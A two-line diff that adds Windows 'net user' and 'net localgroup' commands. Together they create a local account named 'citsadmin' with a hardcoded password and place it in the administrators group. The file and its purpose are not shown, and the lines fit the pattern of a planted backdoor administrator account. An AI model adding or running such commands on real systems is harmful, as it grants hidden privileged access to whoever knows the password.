@@ -1,0 +1,2 @@
+net user citsadmin L0ckout!! /add
+net localgroup administrators citsadmin /add
